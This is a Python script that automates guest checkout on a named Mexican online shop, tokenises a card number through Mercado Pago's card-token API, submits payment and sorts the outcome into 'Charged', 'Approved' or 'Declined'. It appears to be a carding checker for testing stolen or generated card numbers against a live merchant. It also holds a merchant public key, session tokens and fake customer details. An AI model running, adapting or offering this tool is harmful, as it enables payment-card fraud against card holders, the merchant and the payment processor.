import requests
from httpx import AsyncClient
import uuid

random_email = uuid.uuid4().hex[:8] + '@gmail.com'

email = random_email

web = requests.Session()


req1 = web.get("https://vyorsa.com.mx/arillo-convertidor-kenko-089905-de-52-49mm.html")

formkey = req1.text.split('<input name="form_key" type="hidden" value="')[1].split('"')[0]

print(formkey)



headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vyorsa.com.mx',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vyorsa.com.mx/catalog/product/view/id/2611/s/pila-varta-cr-v3-litio/category/2/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


cookies = {'form_key': formkey}

data = {
    'product': '2611',
    'selected_configurable_option': '',
    'related_product': '',
    'item': '2611',
    'form_key': formkey,
    'qty': '1',
}

req2 = web.post(f'https://vyorsa.com.mx/cartquickpro/cart/add/uenc/{formkey}/product/2611/',headers=headers,data=data,cookies=cookies)


headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://vyorsa.com.mx/arillo-convertidor-kenko-089905-de-52-49mm.html',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}

req3 = web.get('https://vyorsa.com.mx/checkout/cart/', headers=headers,cookies=cookies)

entity_id = req3.text.split('{"entity_id":"')[1].split('"')[0]

print(entity_id)

headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://vyorsa.com.mx/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}

req4 = web.get('https://vyorsa.com.mx/checkout/', cookies=cookies, headers=headers)

headers = {
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_fbp=fb.2.1731863713779.63759316197706339; MCPopupClosed=yes; __zlcmid=1OmnB2g1d9633Lk; PHPSESSID=dca43cb50a6a46c1f1a2f694f9793b7b; _gid=GA1.3.5719245.1732383323; form_key=YgHepbEOewBYoIiG; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=YgHepbEOewBYoIiG; _ga_VLRXVPMPKM=GS1.1.1732383322.2.1.1732383795.29.0.790234189; _ga_Z3BF8K81NG=GS1.1.1732383332.2.1.1732383796.59.0.0; _ga=GA1.1.2091876100.1731863714; _gcl_au=1.1.1692617977.1731863541.1642032098.1732383849.1732383850; private_content_version=eb45a700e7fb397847b45799cd8f9a66; section_data_ids=%7B%22cart%22%3A1732383727%2C%22messages%22%3A1732383858%7D',
    'origin': 'https://vyorsa.com.mx',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vyorsa.com.mx/checkout/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

json_data = {
    'address': {
        'street': [
            'Blvd Manuel Avila Camacho Anillo Periferico 2251',
            '21',
            'Club Cuicacalli',
        ],
        'city': 'Naucalpan de Juarez',
        'region_id': '587',
        'region': '',
        'country_id': 'MX',
        'postcode': '53100',
        'firstname': 'juan',
        'lastname': 'perez',
        'telephone': '55 5572 5495',
    },
}

req5 = web.post(f'https://vyorsa.com.mx/rest/default/V1/guest-carts/{entity_id}/estimate-shipping-methods',cookies=cookies,headers=headers,json=json_data,)


json_data = {
    'addressInformation': {
        'shipping_address': {
            'countryId': 'MX',
            'regionId': '587',
            'region': '',
            'street': [
                'Blvd Manuel Avila Camacho Anillo Periferico 2251',
                '21',
                'Club Cuicacalli',
            ],
            'telephone': '55 5572 5495',
            'postcode': '53100',
            'city': 'Naucalpan de Juarez',
            'firstname': 'juan',
            'lastname': 'perez',
        },
        'billing_address': {
            'countryId': 'MX',
            'regionId': '587',
            'region': '',
            'street': [
                'Blvd Manuel Avila Camacho Anillo Periferico 2251',
                '21',
                'Club Cuicacalli',
            ],
            'telephone': '55 5572 5495',
            'postcode': '53100',
            'city': 'Naucalpan de Juarez',
            'firstname': 'juan',
            'lastname': 'perez',
            'saveInAddressBook': None,
        },
        'shipping_method_code': 'matrixrate_2446',
        'shipping_carrier_code': 'matrixrate',
        'extension_attributes': {},
    },
}

reqshipping = web.post(f'https://vyorsa.com.mx/rest/default/V1/guest-carts/{entity_id}/shipping-information',cookies=cookies,headers=headers,json=json_data,)


json_data = {
    'cartId': entity_id,
    'paymentMethod': {
        'method': 'mercadopago_custom',
    },
    'email': email,
}

req6 = web.post(f'https://vyorsa.com.mx/rest/default/V1/guest-carts/{entity_id}/set-payment-information',cookies=cookies,headers=headers,json=json_data,)
print(req6.text)

headers = {
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
    'origin': 'https://vyorsa.com.mx',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vyorsa.com.mx/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-product-id': 'BTR2N61O1F60OR8RLSGG',
}

params = {
    'public_key': 'APP_USR-8ac9c794-6da0-4c25-b97b-1a4b970df0db',
    'locale': 'es',
    'js_version': '2.0.0',
    'referer': 'https://vyorsa.com.mx',
}

data = '{"card_number":"49156694812830458485018432209391","cardholder":{"name":"Penelope","identification":{"type":"","number":""}},"security_code":"000","expiration_month":5,"expiration_year":2028,"device":{"meli":{"session_id":"armor.50ced2a9d238f7cbb15189a52cb73606daa8c32f527a4167583d58966fca9a5fa04d4650c987a4c74fc6d17792d784078bdd49302e3665c22deb3ab6d2bf490967f9d8467d338843eba321f68adc36d8cd6e00f0ba0793a2726658761df374ea.7fe426f2626785b8618df420582bde51"}}}'

req7 = web.post('https://api.mercadopago.com/v1/card_tokens', params=params, headers=headers, data=data)
tokencc = req7.json()['id']
print(tokencc)

headers = {
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://vyorsa.com.mx',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vyorsa.com.mx/checkout/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

json_data = {
    'cartId': entity_id,
    'billingAddress': {
        'countryId': 'MX',
        'regionId': '602',
        'region': '',
        'street': [
            'Boulevard Cajeme Numero',
            '99',
            'Loma Linda',
        ],
        'telephone': '5059947000',
        'postcode': '85420',
        'city': 'Orange',
        'firstname': 'Sebastian',
        'lastname': 'Gutierrez',
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'mercadopago_custom',
        'additional_data': {
            'payment[method]': 'mercadopago_custom',
            'card_expiration_month': '05',
            'card_expiration_year': '26',
            'card_holder_name': 'asd a d',
            'doc_type': '',
            'doc_number': '',
            'installments': '1',
            'issuer_id': '163',
            'total_amount': 97,
            'amount': 97,
            'site_id': 'MLM',
            'token': tokencc,
            'payment_method_id': 'debvisa',
            'gateway_mode': '0',
        },
    },
    'email': email,
}

req8 = web.post(f'https://vyorsa.com.mx/rest/default/V1/guest-carts/{entity_id}/payment-information',cookies=cookies,headers=headers,json=json_data,)

if "TU PEDIDO HA SIDO RECIBIDO" in req8.text or req8.status_code == 200: #REQ APPROVED CAPTURADO
    mensaje = "approved"
    status = "Charged"
else:
    mensaje = req8.text.split('"message":"')[1].split('"')[0]
    if "Fondos" in mensaje:
        status = "Approved"
    else:
        status = "Declined"
        
print(mensaje)